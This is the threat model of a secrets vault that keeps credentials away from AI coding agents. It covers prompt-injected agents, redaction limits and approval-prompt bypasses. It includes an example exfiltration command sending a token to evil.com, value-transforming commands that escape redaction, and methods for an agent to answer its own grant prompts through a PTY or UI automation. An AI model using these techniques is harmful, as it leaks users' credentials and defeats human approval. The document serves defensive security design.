# Threat model

**Status.** The controls below are built unless marked *planned*. The planned ones depend on in-terminal capture in the Pi extension (deferred) or on the npm launcher (Phase 5); see `ROADMAP.md`. Hosts in scope: Claude Code, Codex and Pi / Gentle Shell (Pi through MCP; the extension `qbit-vault-pi` 0.2.3 adds the guard and paste interception when the user installs it).

## Assets

| Asset | Why it matters |
| --- | --- |
| A1. Secret values | Direct credential compromise. |
| A2. The master key | Compromises every value at once. |
| A3. Secret names, descriptions, layers, project roots and scopes | Low-sensitivity metadata, but enables targeted requests and maps which repositories hold which credentials. Encrypted at rest except names in the audit log. |
| A4. The grant store | Widening a grant silently = using a secret without consent. |
| A5. The audit log | Integrity is what lets the user trust "nothing happened that I did not approve". |
| A6. Agent config files touched by `init` | A bad write can lock the user out of their agent or weaken Gentle AI's deny list. |
| A7. The recovery key | Opens the vault on any machine that can reach the server. Lives only with the user. |
| A8. Device keys (`DK`, signing and box keys) | Authenticate a device to the server and receive master keys; a stolen one lets an attacker sync until the device is revoked. |
| A9. The server's copy of the vault | Ciphertext only, but its availability and freshness are what multi-device use and off-machine backup rely on. |
| A10. The export file and its passphrase | Together they are a full copy of the vault: every value, every layer, every piece of metadata. Either alone reveals nothing. |

## Trust boundaries

```
┌─────────────────────────── user's machine ───────────────────────────┐
│                                                                      │
│  ┌─ model boundary (untrusted) ─────────────────────────────────┐    │
│  │  LLM provider  ←→  host agent process (Pi / Claude Code / …) │    │
│  │                     tool calls, tool results, transcript     │    │
│  └──────────────────────────────────────────────────────────────┘    │
│                 │ MCP / CLI (names, refs, redacted output only)      │
│  ┌──────────────▼───────────────────────────────────────────────┐    │
│  │  qbit-vault runtime (trusted): broker, exec, redact, prompt│    │
│  │        │ keychain API        │ child process env             │    │
│  │   OS keychain          the one command that needs the value  │    │
│  │   vault.enc (0600)                                           │    │
│  └──────────────────────────────────────────────────────────────┘    │
│   user's terminal / native dialog (trusted input channel)            │
└──────────────────────────────────────────────────────────────────────┘
```

The whole design is the single rule: **nothing above the model boundary ever holds A1.**

With sync enabled there is a second boundary, outside the machine:

```
 qbit-vault runtime ──HTTPS──▶ qbit-vault-server (untrusted for confidentiality and integrity)
   seals with MK/RVK            stores ciphertext, public keys, counters
   verifies AEAD, AAD,          enforces only tokens, CAS, sizes, rates
   signatures, generation
```

The server is trusted only to be available. Everything it returns is verified on the device; nothing it holds decrypts anything (`REMOTE_SYNC.md`).

## Attackers

- **T1. Prompt-injected agent.** Content the agent reads (a README, an issue, a web page, a dependency's error message) instructs it to exfiltrate credentials. The model is cooperative but not malicious; it will do what the text says if the tools allow it. This is the primary attacker.
- **T2. Curious or buggy agent.** No injection; the model simply does `echo $TOKEN` to "check it is set", or writes it into a `.env` "for convenience", or logs it.
- **T3. Transcript consumers.** The provider, session files on disk, shared session exports, screenshots, the gentle-ai review/RDD pipeline that re-reads transcripts.
- **T4. Local malware or another user on a shared machine** with access to the home directory but not the user's keychain session.
- **T5. Supply chain.** A tampered binary, extension or npm package.
- **T6. Malicious or compromised sync server**, including its operator and anyone who steals its `/data` volume. Can read, drop, replay, reorder and fabricate anything it stores or serves, and sees request metadata.
- **T7. Network attacker** between a device and the server (hostile Wi-Fi, a proxy, a mis-issued certificate).

## Out of scope

- Root/administrator on the machine, kernel compromise, a debugger attached to the user's own processes.
- A compromised OS keychain or an unlocked session left open to a physical attacker.
- The command the user *approved* doing something bad with the credential (e.g. `gh` itself being malicious). qbit-vault bounds *which* process gets the value, not what that process does. Binary allowlists narrow the blast radius; they do not eliminate it.
- Secrets leaking through the *network behavior* of the approved command in v1 (`hosts` is advisory). v2 may add an egress proxy.

## Residual risks (accepted in v1)

- **R1. The approved command exfiltrates.** If the user grants `GITHUB_TOKEN` to `curl` and the agent runs `curl -d "$GITHUB_TOKEN" evil.com`, redaction hides it from the transcript but the request still leaves. Mitigation: binary allowlists (`gh`, not `curl`), `hosts` warnings, the reason string the user sees. Fix in v2: egress proxy / network namespace for exec children.
  - **A granted command can transform and print the value.** Any program that holds the value may hex-encode it, upper-case it, insert spaces between characters, print only a prefix or a suffix, reverse it, or write it to a file the agent reads later (`gh auth token | xxd -p`, `printf '%s' "$T" | tr a-z A-Z`, `echo ${T:0:5}`, `cp /proc/self/environ out.txt`). Redaction (R2) does not see those forms, and the dump-command guard only refuses the well-known patterns. Both are **best-effort layers** that catch the common and the accidental case; they do not make an approved command safe. The boundary is what the user approves (the grant, the binary allowlist, the reason string), not these filters. The guard's coverage of shells other than sh/bash is weaker (`--shell cmd|pwsh` with an allowlist accepts only one simple command, see CLI.md).
- **R2. Redaction is pattern-based and best-effort.** A value transformed in a way we do not model escapes: hex, upper- or lower-casing, characters separated by spaces, partial prefixes or suffixes, a value written to a file and read back, or any transformation a granted command chooses to apply (see R1). *Modeled today* (`internal/redact`): raw; the value with matching surrounding quotes stripped; base64 standard and URL-safe, padded and unpadded; percent-encoding (query, path, strict, Python `urllib.parse.quote` and JavaScript `encodeURIComponent` flavors, upper and lower hex); JSON string bodies (with and without HTML escaping, with and without ASCII-only `\uXXXX` escaping, either hex case, with and without `\/` slash escaping); UTF-16LE and UTF-16BE (what Windows PowerShell 5.1 `>` and `Out-File` write; a BOM before the value is not needed to match); for values of 8 bytes or more, the stable inner base64 substring at each of the three byte alignments, so a value inside a larger base64 blob (HTTP Basic `base64(user:token)`) is found; and for multi-line values, the whole value with the other line-ending convention (LF to CRLF or back) plus each line whose trimmed length is at least 16 bytes as its own raw pattern, so a PEM key or service-account JSON printed line by line is redacted. Matching is leftmost-longest and works across chunk boundaries. *Not modeled*: line-wrapped base64 (MIME/PEM 64 or 76 columns), hex, reversed or ROT13 text, other encodings (HTML entities, base32, gzip), a value split across separate outputs or tool calls, inner base64 for values under 8 bytes, encodings derived from an already transformed value (for example base64 of its percent-encoding), and chained overlap of two different secrets that share bytes (the leftmost match consumes the shared bytes and the rest of the second secret survives). Derived patterns shorter than 4 bytes are dropped; values under 8 bytes are still redacted raw but warned about (R3). The per-line rule has a 16-byte threshold: shorter lines (a lone `}`, `-----`) are never patterns, because they would match unrelated text constantly, so a multi-line secret whose lines are all shorter than that is only caught as a whole. The dump guard also looks past options placed before `-c` (`bash -o pipefail -c …`, `sh --login -c …`, `bash -O extglob -c …`, `bash --rcfile FILE -c …`) and refuses `pwsh`/`powershell` with an encoded command (`-e`, `-ec`, `-enc`, `-EncodedCommand`, any case, `-`, `/` or a typographic dash, `-e:VALUE` too, after any valued option such as `-ExecutionPolicy Bypass` or `-WorkingDirectory /f`) while a secret is injected, since its base64 script cannot be read; the pre-bash hook refuses the same form with the same detection. A panic in an MCP tool or broker op is answered as the typed `internal` refusal and the server keeps serving; the panic text never leaves, stderr gets one fixed line. Mitigation: encodings list is extensible; dump commands refused; the model has no incentive absent injection. Monitor and extend.
- **R3. Short or low-entropy values** cause false positives in redaction or weak protection. Warned at capture time.
- **R4. Native dialog spoofing.** A malicious command could pop its own "qbit-vault" dialog. Mitigation: the real prompt names the session and shows the reason; the Pi/Gentle Shell inline prompt (*planned*, not built) would be rendered by the trusted extension, not by a child process. Accept for v1. The native dialogs (slice 1.10) do not change this: a process that can run commands can open a look-alike window titled "qbit-vault", and the real dialog carries no mark the user can check it against; the user's anchor is that a genuine dialog appears right after they or their host started a qbit-vault command. Residual. The `from: host …, session …` line of the terminal prompt comes from the caller-supplied `--session` (and the host part of it), which is **not authenticated**: a process can claim any host, so the label tells the user who the request says it is from, not who it is. The reason is escaped, and a multi-line paste into a hidden prompt is refused and flushed so it cannot spill into the shell (STORAGE invariant 2).
- **R6. Names in the audit log.** `audit.jsonl` stays cleartext so it can be verified while the vault is locked; a leaked copy reveals secret names, layers and redacted commands, never values. Keyed-hash names are a v2 candidate.
- **R7. Host-controlled `cwd`.** A host shell tool whose working directory the model can change (`cd` inside one bash call) could resolve a different project layer for that exec. With MCP (the only path built) the `cwd` is the server's working directory, which the host sets to the project, not something the model passes; the bash override and hooks that would compute `cwd` after parsing leading `cd` segments are *planned*. The approval dialog names the project. Accepted for v1.
- **R8. `state.json` and `audit.head` are not authenticated.** (With sync enabled, the audit part is narrowed by server-side anchors, L33: a rewrite is detected unless the attacker also controls the server. The rollback counter in `state.json` stays unauthenticated.) A local attacker who can write `$QBIT_VAULT_HOME` can lower the rollback counter and hide a rollback of `vault.enc`, and can rewrite `audit.jsonl` and `audit.head` together (recomputing every hash) so `audit --verify` still passes; `audit.head` only catches accidental truncation and naive deletion of the log's tail (and of the head itself once the log has two records). Out of scope with T4 (local malware with write access to the user's files); file permissions are the only defense. The same holds for `keys/retired.enc`: its write counter is in the sealed header but not in `state.json`, so a local attacker can put back an older valid copy; the worst effect is that `restore` can no longer open the newest older backups (a lost retired key is not recoverable from the file), never a disclosure.
- **R9a. Unwipable environment strings.** `exec` hands values to the child as environment strings; Go's `os/exec` needs `string`s, so those copies cannot be zeroed after the run. Accepted, like the GC note in STORAGE.md; the child process itself holds the value for its lifetime regardless.
- **R9. The agent can run the CLI itself.** `grant`, `set --grant`, `revoke`, `set`, `rm --yes`, `mv`, `edit`, `relink`, `import --yes`, `restore --yes`, `rekey` and `link` are ordinary commands (`import` only moves values the agent's own environment or files already hold into the vault; `restore` and `rekey` read no value out; none of them prints one). An agent that can run commands in its own shell can invoke them, and can even fake a terminal with a pseudo-terminal (`script`, `expect`) to answer the `[y/N]` question of `grant` itself. The y/N question on a terminal is a convenience for the human at the keyboard, not a boundary against an agent with shell access. The terminal backend (slice 1.9) reads the **controlling terminal** (`/dev/tty`, `CONIN$`), never the process stdin, so a plain pipe or redirect cannot answer a prompt, and with no controlling terminal it refuses instead of falling back; but an agent that wraps the command in a PTY it owns and makes it the controlling terminal (`script`, `expect`, `setsid` plus a pty) can still read the question and type the answer, which is why this stays a convenience; the **prompt token** is the strong boundary (random, single use, bound to one request, issued only to the broker's own prompt backend). Closed, where a desktop session exists, by the native out-of-band dialog (slice 1.10): it is a window of the user's desktop that a PTY the agent owns cannot read or type into, and the value returns on the dialog helper's own stdout pipe, not on the terminal. Still open with `QBIT_VAULT_PROMPT=tty`, over SSH, and in a headless session (no `DISPLAY`/`WAYLAND_DISPLAY`, a Windows service session, no helper installed), where the terminal prompt is used. A process of the same user on the same desktop can drive the native dialog **trivially** with UI automation (SendKeys, AppleScript System Events, xdotool); this was verified on Windows, where about 30 lines of PowerShell typed the value and clicked OK. The dialog raises the bar against an agent that only has a PTY, not against arbitrary local code running as the user, which can also read the process memory or the unlocked keychain directly. The helpers are run from fixed system paths (zenity and kdialog only from `/usr/bin`, `/bin` and `/usr/local/bin`), never from `PATH`, so a planted look-alike earlier on `PATH` cannot stand in for them; a process that can write to those system directories is already beyond this threat model. Closed further by host hooks that refuse `qbit-vault` mutating subcommands in the agent's shell (phase 3). Of these, `relink` and `revoke` can only narrow access (`relink` drops the grants of the old layer and carries none over). `exec` run from the agent's own shell is not a bypass: it still needs a grant, goes through the dump guard and allowlist, and redacts its output; but the agent could pick the command it runs under an existing grant, which is R1. Until then a user who runs an agent with an unrestricted shell on the same account must treat grants as advisory.
- **R10. The server withholds, freezes or forks.** A hostile or broken server can refuse every push, serve a frozen state, or show two devices different branches. Integrity and confidentiality hold (L21, L22); availability and freshness do not. Visible symptoms: `pending` pushes, and each device's `last_sync` in the encrypted roster lagging on the others. The local vault keeps working (R-SYNC-09). Mitigation: self-hosting, `remote status`, `doctor`.
- **R11. A revoked device keeps its copy.** Revocation stops future sync and rotates keys, but it cannot erase what the lost machine already decrypted or holds in its local vault. Every credential that device had must be rotated at its provider. A revoked device colluding with the server **before** the other devices see the revocation can forge a rekey under the old key for devices that have not synced since; devices that saw the revocation refuse it (sticky `revoked_at` in their local roster).
- **R12. Clocks decide double edits.** When two devices change the same record, the one with the later hybrid clock wins; a device whose clock runs far ahead wins every such case. The other version is never lost (L32) but becomes a conflict the user resolves.
- **R13. Metadata on the server.** The server learns the account id, the number of devices and their public keys, IP addresses, the time of every sync, the padded size of each version and the number of rekeys (`REMOTE_SYNC.md` § 9). It never learns names, values, paths or labels.
- **R14. The recovery key is all-or-nothing.** Lost, with no device left: the vault is gone; the server cannot help by design. Exposed: whoever has it and can reach the server opens the vault. Mitigation: shown once out of band with a typing check, rotation with `remote recovery-key --rotate`, and every device warns when a device appears through recovery (`REMOTE_SYNC.md` § 4.3).
- **R5. Headless Linux with passphrase** means the passphrase is asked on each unlock (cached with a TTL under `$XDG_RUNTIME_DIR` on Linux only, and only when that directory is tmpfs or ramfs (statfs); on a disk path, and elsewhere, it is asked every time and nothing is written). Usability cost, not a security gap.
- **R15. Hooks are a last line of defense, not a guarantee.** Post-hook redaction runs after the tool ran and only changes what the model sees (telemetry and the user's terminal keep the original). A passphrase vault that is locked cannot be read without a prompt, so it cannot be told whether values are active: `post-bash` and `post-read` withhold the whole output (`output withheld: qbit-vault could not check it for secrets (vault locked)`) and `pre-write` denies the edit, instead of letting them through; the same holds for a vault error, a panic and an event over 64 MiB. With no vault, or no stored value to redact, everything passes unchanged. Only an event that is not JSON, `pre-bash` and `user-prompt` still fail open (the latter with a warning that a QBit Vault tool call opens the unlock dialog). Stored values shorter than 8 bytes are redacted only while an active grant covers them. A value the shell transformed (hex, ROT13, split across table cells) or split across two tool results is not recognized. A host's own hook timeout or crash fails open on Claude Code and Codex (the Pi extension withholds or blocks instead, but streaming partial output in Pi is not covered), and Codex skips a hook the user has not trusted (`/hooks`), so the Codex guard protects nothing until that review. A blocked prompt still lands in Claude Code's transcript and prompt history; `suppressOriginalPrompt` only keeps it out of the block message. The real controls stay the pre hook, the dump guard and `exec` redaction.
- **R16. The export file plus its passphrase is a full copy.** Anyone who holds both reads every secret, on any machine, with no keychain and no server; revoking a device or rotating the master key does not touch an export that already exists. Brute force is offline and bounded only by Argon2id (128 MiB of memory per guess, t=3, p=4) and the 12-character floor: a long random passphrase or a few unrelated words resists, a single dictionary word padded to 12 characters does not. The floor is a minimum, not a guarantee; choose a long random passphrase and keep the file and the passphrase in different places (the command says so after every export). A copy is also only as fresh as the day it was made: secrets added later are not in it. Mitigation: export again after changes, rotate provider credentials if a file and its passphrase may both have leaked.
- **R17. The pre-bash hook is best effort.** It reads the command text before the shell runs it, so a command that builds its real form at run time (`eval` of decoded text, a copied or renamed binary, a script written first and run later) is not recognized. The hook and the dump guard catch the common and the accidental case. The real boundary is the out-of-band prompt (nothing is injected without the user's grant) plus redaction of everything an approved command prints or writes.
- **R18. A project is identified by its path.** The project layer, and the grants of `project` scope, are keyed by the canonical repository root (`STORAGE.md` § Layers). Another repository cloned later at the same path inherits that layer and those grants until the user runs `revoke` or `rm`. Check `grants` before trusting a reused path.
- **R19. The process tree kill has limits.** On POSIX `exec` kills the child's process group, so a descendant that started its own session or group can outlive the run (and keep the injected environment it already inherited); on Windows a job object holds every descendant. A granted command is trusted with its value while it runs (R1).
- **R21. A linked worktree takes the project of its main clone (issue #64).** Project layers and `project` grants are keyed by the repository root (R18), so deciding that a directory belongs to another repository's project is a security decision. `findRoot` (`internal/vault/worktree.go`, the one place that maps a directory to its project) follows a `.git` file to the main working tree only when the link holds both ways: the file names `<main>/.git/worktrees/<id>`, and that directory's `gitdir` file names this worktree's `.git` back, as symlink-resolved paths. Attack: a file planted in a repository the attacker controls (`gitdir: <victim>/.git/worktrees/<id>`) to inherit the victim's project; it fails while the victim's entry points at a live worktree, because that entry names the real worktree and not the attacker's directory. Also refused, the directory keeping its own root: a missing, unreadable, oversized, empty or multi-line pointer file, a symlinked `.git` file, a path that does not resolve or escapes to another layout, a `commondir` naming another repository, a bare repository, a submodule (anything under `.git/modules`), a moved worktree. Residual: someone who can already write inside `<main>/.git` can write both ends (they could equally edit any hook or config there); a stale entry, left when a worktree directory was deleted without `git worktree prune`, still names the old path, so whoever can create that path again (or, on POSIX, a symlink at it) is taken for the worktree: the two-way check cannot tell it from a live one, and `git worktree prune` closes it. This gives nothing to a process that already chooses its own working directory (a shell, `--cwd`); it only matters where the host fixes the directory. And a project layer stored from inside a worktree before this rule is orphaned until `relink`. The files are read with no `git` process, at most 4 KiB each.
- **R20. `exec` without `--session` (issue #64).** The session is not a credential: it is a label the caller chooses (any value of the right form is accepted), so it never protected a `project` grant, which is keyed by the repository. `exec` therefore runs without one, and then only a `project` grant can apply; `once` and `session` grants need the id they were granted to and are refused, unchanged and unspent. A sensitive secret allows only a `once` grant, so it cannot run without a session. Nothing is widened: the same grant covers the same repository as before, and a caller that can run `exec` could already pass any made-up id. The audit records such a run as session `cli`.
- **R22. Jobs and a hard kill of the server (issue #64).** `secret_exec_start` jobs run in the memory of the `qbit-vault mcp` process and end with it (L40), but a process that is killed outright cannot run its shutdown: on POSIX (SIGKILL, the OOM killer, a crash of the runtime) the jobs' children, each in its own process group, keep running until they exit by themselves and keep the environment they were started with: `timeout_ms` does not stop them, because its timer lives in the dead server; on Windows the job object that holds each tree is closed with the process and the tree dies with it. A descendant that left its group (`setsid`) is out of reach on POSIX, as for `exec` (R19). A job that is not read keeps its redacted output in memory up to 10 minutes after it ended, and a status call the client cancels in the instant its answer is being sent can lose the output it had just taken and, when that answer carried the final state, the final state and exit code too (the job is forgotten once reported, and the client no longer waits for the answer): output is never repeated, and in that narrow window it can be missed. The model can see, through the job tools, only redacted output and states, never a value; what a granted command does with its value is R1.
- **R23. What a check discloses (issue #62).** `secret_check` returns, for secrets the caller already holds a usable grant for, the exact length in characters, whether the value is empty, padded, multi-line or a known placeholder, one shape word (`email`, `url`, `jwt`, `pem`, `uuid`, `hex`, `base64`, `number` or `text`) and, for each pair of secrets in the same call, one bit: equal or not. That is accepted because the agent could compute every one of them already: inside `secret_exec` under the same grants `${#NAME}` prints the length and `[ "$A" = "$B" ]` compares two values, with the exit code as the answer (neither prints a value, so the dump guard does not refuse them), and the shape is a handful of tests on the same bytes. A check only makes the answer cheaper and the diagnosis of a rejected credential possible without a replace on a guess. What it does not do: it needs the grant (a name without one refuses the whole call), it never compares a secret with anything outside the call, it spends no `once` grant (so a sensitive secret can be checked only while its one-time grant is unused, as it could be used only then), and it returns nothing from which a value could be rebuilt or tested offline (no prefix, suffix, hash, checksum, entropy or character classes). The shape guess for a PEM block reveals that a key is whole (header and footer present), not what is in it. Residual: a caller can learn, one pair at a time and only among granted secrets, whether two stored values are equal, and can binary-search a length it could already read with `${#NAME}`; nothing about the content leaves the vault.
- **R24. A replaced value stays in the vault for 7 days (issue #62).** A stored previous value (`STORAGE.md` § Previous value) widens what a compromise of the vault yields: whoever holds the master key and `vault.enc`, or a backup, reads the value a record had before its last replacement for up to 7 days after it was replaced, and a credential the user replaced because it leaked is, for that week, still in the vault. It is protected exactly like the current value (the same encrypted body, never a side file, a log, the audit log or the export file), travels with backups, `restore`, `rekey` and sync (sealed to the same keys), and is dropped from the body at the first write after 7 days. A backup made earlier keeps whatever it held, as for every value. A user who replaces a credential because it leaked should also revoke it at the service. The agent never sees a previous value: `secret_list` shows only `previous_until`, `secret_check` does not describe it, `exec` injects and redacts current values only, and the hooks' guards redact it too (a recoverable previous value is a stored value). Restoring it is a user decision: `qbit-vault revert`, or an agent's `secret_manage revert` that the user confirms in a dialog naming the secret and when it was replaced, never a value or a length; a revert gives the record a new id and drops its grants, so a permission never carries over to a different value. Residual: an older binary on a synced account drops the field silently (it may vanish earlier than 7 days).
- **R25. The usage file discloses when a secret was used (issue #62).** `usage.enc` (`STORAGE.md` § Usage file) records, per record and sealed with the master key, when a command last had it injected, its exit code and the last exit 0: a timeline of use, no command, directory or session. Someone who can read the home *and* decrypt it learns when each secret was last used and whether it worked; without the key it reveals the format and a write counter. The agent sees the same three fields in `secret_list` (accepted: it triggered every use itself, and they are what lets it tell "worked before" from "never worked"); an exit code of 0 is a hint, not proof the service accepted the credential. It is not a control: it is unauthenticated against rollback (an older copy restores an older history), it is local, and deleting it is harmless.

## Security review checklist for PRs

- [ ] Does any new code path produce output that could include a `Secret`? Does it go through `redact`?
- [ ] Does any new CLI flag accept a value positionally (shell history)?
- [ ] Does any new host adapter write a file without `filemerge` snapshot + atomic rename?
- [ ] Does the change add a way to create or widen a grant that is not a user interaction?
- [ ] Does the change add a way to mutate the vault (`manage`, `mv`, `rm`, `edit`) that does not require a user confirmation?
- [ ] Can any model-supplied field select a project other than the one of the host-supplied `cwd`?
- [ ] Does a new remote command show a key or code anywhere but the prompt backend, or accept one as an argument or on stdin?
- [ ] Does any new server endpoint store or log something that is not ciphertext, a public key, a counter or a timestamp?
- [ ] Does the client use anything downloaded before verifying AEAD, AAD (account, generation, version) and signatures?
- [ ] Does a new job or background path buffer output before it is redacted, hold a value or a key longer than the child needs it, or let a child outlive the process that holds its grant (L39 to L43, R22)?
- [ ] Is the leak test extended?
